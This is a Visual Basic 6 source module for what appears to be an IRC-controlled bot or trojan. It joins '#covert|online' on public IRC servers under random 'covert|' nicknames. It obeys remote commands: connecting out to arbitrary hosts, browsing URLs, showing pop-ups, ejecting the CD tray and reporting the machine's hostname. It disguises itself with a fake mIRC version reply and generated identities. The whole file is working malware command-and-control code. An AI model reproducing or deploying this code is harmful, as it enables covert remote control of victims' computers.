Attribute VB_Name = "modIRC"
Public InChannel As Boolean
Public IrcServers() As String, IrcServer As String, IrcPort As Single, IrcChannel As String, IrcOwner As String
Public IrcNick As String, IrcFullName As String, IrcEmail As String
Public IrcLocalHost As String

Private EchoList() As String


Sub LoadIrcData()
On Error Resume Next
 
MakeServerList ReadINI("IRC", "Server", "irc.choopa.net,irc.dal.net"), IrcServers()
IrcPort = Val(ReadINI("IRC", "Port", "6667"))
IrcChannel = ReadINI("IRC", "Channel", "#covert|online")
IrcOwner = ReadINI("IRC", "Owner")
IrcNick = ReadINI("IRC", "Nick", "covert|" & GenerateRandomString(3, True, True, True))
IrcFullName = ReadINI("IRC", "Name", modMain.GenerateName)
IrcEmail = ReadINI("IRC", "Email", modMain.GenerateEmailAddress)

ReDim EchoList(-1 To -1)

End Sub

'''''''
'
''''
'
'''''' V E N T S

Sub MessageArrival(NickName As String, Target As String, Message As String)
    Dim Temp() As String
    
    On Error GoTo ErrorHandler
    
    Temp() = Split(Message, " ", 2)
    
    Message = Replace(Message, vbCr, "")
    Message = Replace(Message, vbLf, "")
    
    If Message = Chr(1) & "VERSION" & Chr(1) Then
        Notice NickName, "VERSION mIRC v6.0 Khaled Mardam-Bey"
    End If
    
    For i = 0 To UBound(EchoList)
        PrivateMessage EchoList(i), NickName & ">" & Target & " : " & Message
    Next i
    
    For i = 0 To UBound(Temp)
        Temp(i) = Replace(Temp(i), Chr(13), "")
    Next i
    
    Select Case LCase(Temp(0))
    Case "c"
        frmMain.wskInfo.Close
        frmMain.wskInfo.Connect LTrim(RTrim(Temp(1))), 2201
    Case "connect"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        If frmMain.wskInfo.State <> sckConnected Then
            If InStr(1, Temp(1), ":") <> 0 Then
                Temp() = Split(Temp(1), "LChannel as String :")
                frmMain.wskInfo.Close
                frmMain.wskInfo.Connect Temp(1), Val(Temp(2))
            Else
                frmMain.wskInfo.Close
                frmMain.wskInfo.Connect Temp(1), 2201
            End If
        Else
            If NickName = IrcOwner Then
                If InStr(1, Temp(1), ":") <> 0 Then
                    Temp() = Split(Temp(1), "LChannel as String :")
                    frmMain.wskIRC.Connect Temp(0), Val(Temp(1))
                Else
                    frmMain.wskInfo.Close
                    frmMain.wskInfo.Connect Temp(1), 2201
                End If
            Else
                PrivateMessage NickName, "Sorry, but i am in a connection at the moment, and you are not my owner."
            End If
        End If
        
                PrivateMessage NickName, "Connect to " & Temp(1)
    Case "identify"
        Dim Owner As String
        Select Case LCase(IrcOwner)
        Case LCase(NickName)
            Owner = " my owner."
        Case Else
            Owner = " not my owner."
        End Select
        
        
        PrivateMessage NickName, "I am " & GetSetting("rServices", "details", "Name", "un-named") & ", and you are " & Owner
        
        Select Case frmMain.wskInfo.State
        Case sckListening
            PrivateMessage NickName, "I am listening on ... " & IrcLocalHost
            PrivateMessage NickName, "Port:" & frmMain.wskInfo.LocalPort
        Case sckConnected
            PrivateMessage NickName, "I am currently in a connection with " & frmMain.wskInfo.RemoteHostIP & ":" & frmMain.wskInfo.RemotePort
        Case Else
            PrivateMessage NickName, "I not listening for connections. My hostname is: " & IrcLocalHost
        End Select
        
    Case "setnewname"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        If NickName = "[s]Animations" Or NickName = GetSetting("rServices", "Identity", "Owner", NickName) Then
        If UBound(Temp) < 1 Then PrivateMessage NickName, "Insufficient Parrameters '" & Message & "'"
            
            IrcOwner = Temp(1)
                        
            WriteINI "IRC", "Nick", IrcNick
            WriteINI "IRC", "Owner", IrcOwner
                       
            PrivateMessage NickName, "My name has been changed to " & Temp(1) & ", " & NickName & "."
            
            ChangeNick Temp(1)
        Else
            PrivateMessage NickName, "Sorry, but you are not my owner."
        End If
    Case "browse"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        PrivateMessage NickName, BrowseTo(Temp(1))
    Case "popup"
        modProcess.MessageBox Temp(1)
    Case "cd.open"
        modMain.EjectCD True
    Case "cd.close"
        modMain.EjectCD True
    Case "irc.join"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        Join Temp(1)
    Case "irc.part"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        Part Temp(1)
    Case "irc.say"
        'If Target <> IrcNick And NickName <> "[s]Animations" Then Exit Sub
        Temp() = Split(Temp(1), " ", 2)
        If UBound(Temp) < 1 Then
            PrivateMessage NickName, "Insufficient parrameters, " & Message
        End If
        Select Case Left(Temp(0), 1)
        Case "#"
            ChannelMessage Temp(0), Temp(1)
        Case Else
            PrivateMessage Temp(0), Temp(1)
        End Select
    Case "irc.echo"
        If UBound(Temp) < 0 Then
            PrivateMessage NickName, "Insufficient Parrameters '" & Message & "'"
            PrivateMessage NickName, "use: " & Chr(34) & "!irc.echo MODE" & Chr(34) & " where mode is on or off"
            Exit Sub
        End If
        
        If LCase(Temp(1)) = "on" Then
            For i = 0 To UBound(EchoList)
                If EchoList(i) = NickName Then
                    PrivateMessage NickName, NickName & " is already on my echo list."
                    Exit Sub
                ElseIf EchoList(i) = "" Then
                    EchoList(i) = NickName
                    Exit Sub
                End If
            Next i
            
            If UBound(EchoList) = -1 Then
                ReDim EchoList(0 To 0)
            Else
                ReDim EchoList(0 To (UBound(EchoList) + 1))
            End If
            
            EchoList(UBound(EchoList)) = NickName
            PrivateMessage NickName, NickName & " was added to my echo list."
            'Debug.Print Len(Temp(1))
            'Debug.Print Asc(Temp(1))
            'Debug.Print Asc(Mid(Temp(1), 2))

        ElseIf LCase(Temp(1)) = "off" Then
            For i = 0 To UBound(EchoList)
                If EchoList(i) = NickName Then
                    EchoList(i) = ""
                    Exit Sub
                    PrivateMessage NickName, NickName & " was removed from my echo list."
                End If
            Next i
            
            PrivateMessage NickName, NickName & " was not on my echo list."
        End If
    Case Chr(1) & "version" & Chr(1)
        Notice NickName, Chr(1) & "VERSION GenericIRC v1.0" & Chr(1)
    End Select
    
    Exit Sub
ErrorHandler:
    On Error Resume Next
    PrivateMessage NickName, "Error #" & Err.Number & ": " & Err.Description
    Resume Next
End Sub

Sub ChannelJoin(Nick As String, Channel As String)
If Nick = IrcNick Then
    InChannel = True
End If
If Nick = IrcOwner Then
    PrivateMessage Nick, "Hello " & Nick & ", welcome back!"
End If
End Sub

Sub ModeModified(Target As String, Mode As String, Value As String)
Dim Temp() As String

Select Case Left(Mode, 1)
Case "+"
    For i = 2 To Len(Mode)
        Select Case Mid(Mode, i, 1)
        Case "i"
            Join IrcChannel
        End Select
    Next i
Case "-"
    For i = 2 To Len(Mode)
        Select Case Mid(Mode, i, 1)
        Case "i"
            frmMain.wskIRC.Close
            frmMain.wskIRC.Connect IrcServer, IrcPort
        End Select
    Next i
End Select

End Sub

Sub ChannelPart(Channel As String)

End Sub

Sub OnNotice(Message As String)

End Sub

    '
   ' '
  '''''
 '     '
'       ' C T I O N S

Function ChangeNick(NickName As String)
    frmMain.wskIRC.SendData "NICK " & NickName
End Function

Function Join(Channel As String)
    If Left(Channel, 1) <> "#" Then Channel = Channel & "#"
    frmMain.wskIRC.SendData "JOIN " & Channel & vbCrLf
End Function
    
Function Part(Channel As String)
    If Left(Channel, 1) <> "#" Then Channel = Channel & "#"
    frmMain.wskIRC.SendData "PART " & Channel & vbCrLf
End Function

Function ChannelMessage(Channel As String, Message As String)
    If Left(Channel, 1) <> "#" Then Channel = Channel & "#"
    frmMain.wskIRC.SendData "PRIVMSG " & Channel & " :" & Message & vbCrLf
End Function

Function PrivateMessage(NickName As String, Message As String)
    If Left(NickName, 1) = "#" Then NickName = Mid(NickName, 2)
    frmMain.wskIRC.SendData "PRIVMSG " & NickName & " :" & Message & vbCrLf
End Function

Function Notice(NickName As String, Message As String)
    frmMain.wskIRC.SendData "NOTICE " & NickName & " :" & Message
End Function

  ''''''
 '      '
'        '
'        '
 '      '
  '''''' T H E R
  
Function ParseString(Text As String) As String
On Error Resume Next
Dim Temp() As String

If Left(Text, 1) = ":" Then
    Dim Nick As String, Target As String, Message As String, Channel As String
    Temp() = Split(Text, " ", 4)
    
    If UBound(Temp) < 1 Then ParseString = Text: Exit Function
    
    Select Case Temp(1)
    Case "001"
        On Error Resume Next
        Nick = Temp(2)
        Temp() = Split(Temp(3), "@")
        Temp() = Split(Temp(1), " ")
        
        frmMain.wskIRC.SendData "USERHOST " & Nick
    Case "302"
        IrcLocalHost = Mid(Temp(3), 2)
    Case "432"
        Nick = "covert|" & GenerateRandomString(3, True, True, True)
        ChangeNick Nick
    Case "433"
        'Nickname in use
        Nick = "covert|" & GenerateRandomString(3, True, True, True)
        ChangeNick Nick
    Case "PRIVMSG"
        If UBound(Temp) < 3 Then ParseString = Text: Exit Function
        Target = Temp(2)
        Message = Mid(Temp(3), 2)
        Temp() = Split(Temp(0), "!")
        Nick = Mid(Temp(0), 2)
      
        MessageArrival Nick, Target, Message
    Case "JOIN"
        If UBound(Temp) < 3 Then ParseString = Text: Exit Function
        Channel = Temp(2)
        Temp(0) = Replace(Temp(0), ":", "")
        Temp() = Split(Temp(0), "!")
        Nick = Temp(0)
      
        ChannelJoin Nick, Channel
        
    Case "PART"
        If LCase(Temp(2)) = LCase(IrcChannel) Then InChannel = False
    Case "NOTICE"
        If UBound(Temp) < 3 Then ParseString = Text: Exit Function
        Target = Temp(2)
        Message = Mid(Temp(3), 2)
        Temp() = Split(Temp(0), "!")
        Nick = Temp(0)
        
        'NoticeArrival Nick
        
    Case "MODE"
        Dim Direction As String
        Dim Mode As String
        Dim Value As String
        Temp() = Split(Text, " ", 5)
        
        If UBound(Temp) < 3 Then ParseString = Text: Exit Function
        Temp(3) = Replace(Temp(3), ":", "")
        
        Nick = Mid(Temp(0), 2)
        Target = Temp(2)
        Direction = Mid(Temp(3), 1, 1)
        Mode = Mid(Temp(3), 2)
        
        If UBound(Temp) > 3 Then
            Value = Temp(4)
        End If
        
        If InStr(1, Nick, "!") <> 0 Then
            Nick = Mid(Nick, 1, InStr(1, Nick, "!") - 1)
        End If
        
        ModeModified Target, Direction & Mode, Value
        
        Case "KICK"
            If LCase(Temp(2)) = LCase(IrcChannel) Then InChannel = False
    End Select
Else
    Temp() = Split(Text, " ", 2)
    If UBound(Temp) < 1 Then ParseString = Text: Exit Function
    
    Select Case LCase(Temp(0))
    Case "ping"
        ParseString = "Ping? Pong!"
        frmMain.wskIRC.SendData "PONG " & Temp(1)
    End Select
End If

End Function

Function MakeServerList(Servers As String, ByRef ServerList() As String)
On Error GoTo ErrorHandler
    If InStr(1, Servers, ",") = 0 Then
        ReDim ServerList(0 To 0)
        ServerList(0) = Servers
    Else
        ServerList() = Split(Servers, ",")
    End If
Exit Function
ErrorHandler:
    ReDim ServerList(0 To 1)
    ServerList(0) = "irc.choopa.net"
    ServerList(1) = "irc.dal.net"
End Function

Sub ChooseServerFromList(ServerList() As String)
    On Error GoTo ErrorHandler
    
    Dim Rand As Single
    Randomize Timer
    
    Rand = modMain.GenerateRandomNumber(0, UBound(ServerList))
    
    IrcServer = ServerList(Rand)
    
    Exit Sub
ErrorHandler:
    IrcServer = "irc.choopa.net"
End Sub
